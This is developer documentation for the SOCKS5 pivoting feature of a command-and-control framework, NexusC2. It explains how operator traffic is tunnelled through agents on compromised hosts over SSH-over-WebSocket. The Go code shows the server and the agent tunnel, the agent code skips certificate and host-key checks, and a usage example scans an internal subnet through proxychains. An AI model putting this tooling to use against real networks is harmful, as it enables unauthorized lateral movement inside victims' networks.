---
title: "SOCKS Proxy"
description: "Create SOCKS5 proxy tunnels through agents for network pivoting."
weight: 9
---
## Overview

NexusC2 provides SOCKS5 proxy capability that tunnels network traffic through deployed agents. This enables operators to route traffic through compromised hosts, accessing internal network resources that aren't directly reachable from the C2 server.

**Key Features:**
- SSH-over-WebSocket tunnel for reliability
- SOCKS5 protocol compliance
- Two-layer authentication (SOCKS5 + SSH)
- Connection pooling and limits
- Stale connection cleanup
- Dynamic keepalive based on agent callback rate

**Platforms:** All (Windows, Linux, macOS)

---

## Architecture

{{< mermaid >}}
flowchart TB
    subgraph Operator["Operator Workstation"]
        TOOL[Operator Tool<br/>nmap, curl, etc.]
    end

    subgraph Server["NexusC2 Server"]
        SOCKS[SOCKS5 Listener<br/>0.0.0.0:PORT]
        SSH_SRV[SSH Server]
    end

    subgraph Agent["Agent Process"]
        SSH_CLI[SSH Client]
        WSS[WSS Connection]
    end

    subgraph Target["Internal Network"]
        RES[Target Resource<br/>internal host:port]
    end

    TOOL -->|SOCKS5 connect<br/>127.0.0.1:PORT| SOCKS
    SOCKS --> SSH_SRV
    SSH_SRV <-->|SSH-over-WebSocket<br/>tunnel| WSS
    WSS --> SSH_CLI
    SSH_CLI -->|TCP connection| RES
{{< /mermaid >}}

---

## Communication Flow

### Connection Establishment

```
1. Operator starts SOCKS proxy on agent
   → Server creates SOCKS5 listener + SSH server
   → Server generates credentials

2. Agent receives socks command
   → Agent connects via WebSocket (wss://server:port/path)
   → Agent performs SSH handshake as client
   → Tunnel is established

3. Operator configures proxy (e.g., proxychains)
   → Tool connects to SOCKS5 listener
   → Server authenticates SOCKS connection
```

### Data Forwarding

```
1. Tool sends SOCKS5 CONNECT request
   → Server parses target host:port
   → Server opens SSH channel to agent

2. Agent receives channel open request
   → Agent connects to target via TCP
   → Agent accepts SSH channel

3. Bidirectional data flow
   ← Tool → Server → SSH Channel → Agent → Target →
```

---

## Server-Side Components

### SOCKS5 Listener

The server runs a standard SOCKS5 server:

```go
type Server struct {
    socksPort     int
    socksListener net.Listener
    sshConfig     *ssh.ServerConfig
    sshConn       *ssh.ServerConn
    sshChannels   <-chan ssh.NewChannel
    forwardChan   chan *ForwardRequest
}
```

### SOCKS5 Authentication

The server accepts connections without user authentication (handled at SSH layer):

```go
func (s *Server) handleSocksAuth(conn net.Conn) error {
    // Read SOCKS5 version and methods
    buf := make([]byte, 2)
    io.ReadFull(conn, buf)

    if buf[0] != 0x05 {
        return fmt.Errorf("unsupported SOCKS version")
    }

    // Read methods offered
    methods := make([]byte, buf[1])
    io.ReadFull(conn, methods)

    // Accept no authentication (0x00)
    conn.Write([]byte{0x05, 0x00})
    return nil
}
```

### SSH Server

The server hosts an SSH server for the agent to connect to:

```go
config := &ssh.ServerConfig{
    PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
        if c.User() == creds.Username && string(pass) == creds.Password {
            return nil, nil
        }
        return nil, fmt.Errorf("invalid credentials")
    },
}

// Generate ephemeral host key
hostKey, _ := generateHostKey()
config.AddHostKey(hostKey)
```

### Forwarding Mechanism

When a SOCKS connection requests a target, the server opens an SSH channel:

```go
func (s *Server) handleTunnelForwarding(clientConn net.Conn, target string) {
    // Open direct-tcpip channel to agent
    channel, reqs, _ := sshConn.OpenChannel("direct-tcpip", ssh.Marshal(&struct {
        DestAddr   string
        DestPort   uint32
        OriginAddr string
        OriginPort uint32
    }{
        DestAddr:   target,
        DestPort:   0,
        OriginAddr: "127.0.0.1",
        OriginPort: 0,
    }))

    // Bridge client connection and SSH channel
    go io.Copy(channel, clientConn)    // Client → Target
    go io.Copy(clientConn, channel)    // Target → Client
}
```

---

## Agent-Side Components

### WebSocket Connection

The agent connects to the server via secure WebSocket:

```go
dialer := websocket.Dialer{
    TLSClientConfig: &tls.Config{
        InsecureSkipVerify: true,
    },
    HandshakeTimeout:  10 * time.Second,
    EnableCompression: false,
}

wsURL := fmt.Sprintf("wss://%s:%d%s", host, port, path)
wsConn, _, _ := dialer.Dial(wsURL, nil)
```

### SSH Client

The agent acts as an SSH client over the WebSocket:

```go
sshConfig := &ssh.ClientConfig{
    User: credentials.Username,
    Auth: []ssh.AuthMethod{
        ssh.Password(credentials.Password),
    },
    HostKeyCallback: ssh.InsecureIgnoreHostKey(),
    Timeout:         10 * time.Second,
}

// Wrap WebSocket in net.Conn interface
wrapped := &wsConnWrapper{conn: wsConn}
sshConn, chans, reqs, _ := ssh.NewClientConn(wrapped, "", sshConfig)
```

### Channel Handler

The agent handles channel open requests (direct-tcpip):

```go
func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
    if newChannel.ChannelType() != "direct-tcpip" {
        newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
        return
    }

    // Parse forwarding request
    var req struct {
        DestAddr   string
        DestPort   uint32
        OriginAddr string
        OriginPort uint32
    }
    ssh.Unmarshal(newChannel.ExtraData(), &req)

    // Connect to target
    target := req.DestAddr
    targetConn, _ := net.DialTimeout("tcp", target, 10*time.Second)

    // Accept channel
    channel, requests, _ := newChannel.Accept()

    // Bridge data
    go io.Copy(targetConn, channel)  // Channel → Target
    go io.Copy(channel, targetConn)  // Target → Channel
}
```

---

## Authentication

### Two-Layer Authentication

| Layer | Authentication | Purpose |
|-------|---------------|---------|
| SOCKS5 | None (0x00) | Protocol compliance |
| SSH | Username + Password | Agent authentication |

### Credential Generation

Credentials are generated per-session:

```go
type Credentials struct {
    Username string
    Password string
    SSHKey   []byte  // Optional SSH key
}
```

---

## Connection Management

### Connection Limits

The agent enforces connection limits to prevent resource exhaustion:

```go
c.maxConnections = 50  // Maximum concurrent tunnels

if c.currentConns >= c.maxConnections {
    newChannel.Reject(ssh.ResourceShortage, "connection limit reached")
    return
}
```

### Tunnel Tracking

Each active tunnel is tracked:

```go
type TunnelInfo struct {
    Target       string
    StartTime    time.Time
    LastActivity time.Time
    BytesSent    int64
    BytesRecv    int64
}
```

### Stale Connection Cleanup

Idle tunnels are automatically cleaned up:

```go
func (c *SocksCommand) cleanupStaleTunnels() {
    ticker := time.NewTicker(30 * time.Second)
    for range ticker.C {
        c.tunnelsMu.Lock()
        for connID, info := range c.activeTunnels {
            // Remove tunnels idle for more than 5 minutes
            if time.Since(info.LastActivity) > 5*time.Minute {
                delete(c.activeTunnels, connID)
                c.currentConns--
            }
        }
        c.tunnelsMu.Unlock()
    }
}
```

---

## Keepalive Mechanism

### Dynamic Interval

Keepalive adapts to agent callback rate:

```go
func (c *SocksCommand) calculateKeepaliveInterval() time.Duration {
    // Parse current sleep and jitter
    sleepSeconds := 60
    jitterPercent := 10.0

    // Calculate average callback interval
    avgCallbackInterval := float64(sleepSeconds) * (1.0 + jitterPercent/200.0)

    // Set keepalive to half the callback interval
    keepaliveInterval := time.Duration(avgCallbackInterval/2.0) * time.Second

    // Enforce bounds (10s - 2min)
    if keepaliveInterval < 10*time.Second {
        return 10 * time.Second
    }
    if keepaliveInterval > 120*time.Second {
        return 120 * time.Second
    }
    return keepaliveInterval
}
```

### SSH Keepalive

The agent sends SSH keepalive requests:

```go
func (c *SocksCommand) keepAlive(sshConn ssh.Conn) {
    for c.running {
        interval := c.calculateKeepaliveInterval()
        time.Sleep(interval)

        _, _, err := sshConn.SendRequest("keepalive@golang.org", true, nil)
        if err != nil {
            // Connection lost, trigger cleanup
            c.running = false
            c.wsConn.Close()
            break
        }
    }
}
```

---

## Command Configuration

### Start SOCKS Proxy

```json
{
  "action": "start",
  "socks_port": 1080,
  "wss_port": 3131,
  "wss_host": "c2.example.com",
  "path": "/socks/agent-uuid",
  "credentials": {
    "username": "generated_user",
    "password": "generated_pass",
    "ssh_key": "<base64 optional>"
  }
}
```

### Stop SOCKS Proxy

```json
{
  "action": "stop"
}
```

---

## WebSocket Wrapper

The WebSocket connection is wrapped to implement `net.Conn`:

```go
type wsConnWrapper struct {
    conn        *websocket.Conn
    buf         []byte
    bufFromPool bool
}

func (w *wsConnWrapper) Read(b []byte) (n int, err error) {
    if len(w.buf) == 0 {
        _, message, err := w.conn.ReadMessage()
        if err != nil {
            return 0, err
        }
        w.buf = message
    }
    n = copy(b, w.buf)
    w.buf = w.buf[n:]
    return n, nil
}

func (w *wsConnWrapper) Write(b []byte) (n int, err error) {
    err = w.conn.WriteMessage(websocket.BinaryMessage, b)
    return len(b), err
}
```

---

## Data Transfer

### Buffer Pooling

Memory is efficiently managed with buffer pools:

```go
var wsBufferPool = sync.Pool{
    New: func() interface{} {
        buf := make([]byte, 0, 32*1024) // 32KB capacity
        return &buf
    },
}
```

### Timeout Handling

Data copies enforce idle timeouts:

```go
func (c *SocksCommand) copyWithTimeout(dst io.Writer, src io.Reader, connID string, isSend bool) (int64, error) {
    const idleTimeout = 5 * time.Minute
    buf := make([]byte, 32*1024)

    for {
        if conn, ok := src.(net.Conn); ok {
            conn.SetReadDeadline(time.Now().Add(idleTimeout))
        }

        nr, err := src.Read(buf)
        if nr > 0 {
            nw, ew := dst.Write(buf[0:nr])
            // ... handle write
        }
        if err != nil {
            return written, err
        }
    }
}
```

---

## Configuration Summary

| Parameter | Server Default | Agent Default |
|-----------|---------------|---------------|
| SOCKS Port | User-specified | N/A |
| WebSocket Port | 3131 | 3131 |
| Max Connections | N/A | 50 |
| Idle Timeout | 10 minutes | 5 minutes |
| Buffer Size | 32 KB | 32 KB |
| Keepalive | N/A | Dynamic (10s-2min) |
| Stale Cleanup | N/A | 30 seconds |

---

## Usage Example

### Start Proxy

```
socks start 1080
```

### Use with proxychains

```bash
# /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080

# Run commands through proxy
proxychains nmap -sT 192.168.1.0/24
proxychains curl http://internal-server/
```

### Stop Proxy

```
socks stop
```

---

## Limitations

| Limitation | Description |
|------------|-------------|
| UDP | SOCKS5 UDP not supported |
| Concurrent | Max 50 concurrent tunnels per agent |
| Latency | Adds round-trip through agent |
| Authentication | No SOCKS5 user auth (SSH handles auth) |
| IPv6 | Supported but may have edge cases |

---

## Related Files

| Component | File Path |
|-----------|-----------|
| Server SOCKS | `server/internal/agent/socks/socks_server.go` |
| Server Bridge | `server/internal/agent/socks/socks_bridge.go` |
| Server Handler | `server/internal/agent/handlers/socks_handler.go` |
| WebSocket Handler | `server/internal/websocket/handlers/socks.go` |
| Agent SOCKS (Linux) | `server/docker/payloads/Linux/action_socks.go` |
| Agent SOCKS (Windows) | `server/docker/payloads/Windows/action_socks.go` |
| Agent SOCKS (macOS) | `server/docker/payloads/Darwin/action_socks.go` |
